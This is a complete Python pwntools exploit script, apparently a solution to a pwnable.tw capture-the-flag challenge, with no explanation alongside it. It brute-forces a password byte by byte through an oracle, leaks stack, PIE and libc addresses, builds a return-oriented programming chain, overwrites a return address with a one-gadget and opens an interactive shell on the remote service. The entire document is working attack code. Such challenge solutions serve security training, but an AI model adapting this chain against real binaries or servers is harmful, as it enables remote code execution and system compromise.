from pwn import *
#s = remote('192.168.0.85',1234)
s = remote('chall.pwnable.tw', 10205)
def password(dat):
  s.recvuntil('>>')
  s.send('1')
  s.recvuntil('passowrd :')
  s.send(dat)
def rop(dat):
  password(dat)
  s.recvuntil('>>')
  s.send('3\n')
  s.recvuntil('Copy :')
  s.send('A')
# STAGE 1 -- find password
rand = ''
for j in xrange(16):
  for i in range(1,0x100):
    password(rand+struct.pack('<B',i)+'\x00')
    r = s.recvuntil('!') 
    if r != 'Failed !':
      print list(rand)
      rand += struct.pack('<B',i)
      s.recvuntil('>>')
      s.send('1\n')
      break;
#STAGE 3 -- find stack
dat1 = '\x00'
dat1 += 'A'*(0x60-0x20-1)
dat1 += rand
dat1 += 'A'*0x10 #+ 'A'*0x18
password(dat1)
s.recvuntil('>>')
s.send('3\n')
s.recvuntil('Copy :')
s.send('a')
s.recvuntil('>>')
s.send('1')

dat2 = rand
dat2 += '1'+ 'A'*0x7 + 'A'*0x8
tmp = ''
#raw_input('$')
for j in xrange(8):
  for i in range(1,0x100):
    password(dat2+tmp+struct.pack('<B',i)+'\x00')
    r = s.recvuntil('!')
    if r != 'Failed !':
      tmp += struct.pack('<B',i)
      print list(tmp)
      s.recvuntil('>>')
      s.send('1')
      break;
stack = u64(tmp+'\x00\x00')
log.info('Stack : 0x%x'%stack)

# STAGE 2 -- find PIE
dat1 = '\x00'
dat1 += 'A'*(0x60-0x20-1)
dat1 += rand
dat1 += 'A'*0x10 + 'A'*0x18
password(dat1)
s.recvuntil('>>')
s.send('3\n')
s.recvuntil('Copy :')
s.send('A')
s.recvuntil('>>')
s.send('1')

dat2 = rand
dat2 += '1'+ 'A'*0x7 + 'A'*0x8 + 'A'*0x18
tmp = ''
for j in xrange(8):
  for i in range(1,0x100):
    password(dat2+tmp+struct.pack('<B',i)+'\x00')
    r = s.recvuntil('!')
    if r != 'Failed !':
      tmp += struct.pack('<B',i)
      print list(tmp)
      s.recvuntil('>>')
      s.send('1')
      break;
pie = u64(tmp+'\x00\x00') - 0xdec
log.info('PIE : 0x%x'%pie)

# Setting ROP
'''
010c3 -- pop rdi ; ret
0201F60 -- puts_got
00AE0 -- puts
00ECF -- main
0xd0-0x8 -- rop stack
'''
dat = '\x00'
dat += 'A'*(0x60-0x20-1) + rand + 'A'*0x18 + 'B'*7 + '\x00'
rop(dat)
s.recvuntil('>>')
s.send('1')

dat = '\x00'
dat += 'A'*(0x60-0x20-1) + rand + 'A'*0x18 + p64(pie + 0x0E12)[:-1]
rop(dat)
s.recvuntil('>>')
s.send('1')

dat = '\x00'
dat += 'A'*(0x60-0x20-1) + rand + 'A'*0x10 + 'B'*7 + '\x00'
rop(dat)
s.recvuntil('>>')
s.send('1')

dat = '\x00'
dat += 'A'*(0x60-0x20-1) + rand + 'A'*0x10 + p64(stack -(0xd0 + 0x8) +0x80)[:-1]
rop(dat)

s.recvuntil('>>')
s.send('2\n')
'''
0x00000000000010c3 : pop rdi ; ret
0x00000000000010c1 : pop rsi ; pop r15 ; ret
00B20 -- read
001188BB : pop rdx ; pop rbx ; ret
'''
here = stack -(0xd0 + 0x8)

dat = ''
dat += p64(pie + 0x10c3) # gadget
dat += p64(pie + 0x201FB0) # __libc_start_main
dat += p64(pie + 0x0AE0) # puts
dat += p64(pie + 0x10c3)
dat += p64(here + len(dat ) + 0x28)
dat += p64(pie + 0x10c1)
dat += p64(1234)
dat += p64(1234)
dat += p64(pie+0xca0)
s.send(dat)
libc = u64(s.recvuntil('\x7f')[1:] + '\x00\x00') - 0x20740
log.info('Libc : 0x%x'%libc)
s.send(p64(libc+0x0EF6C4))
s.interactive()
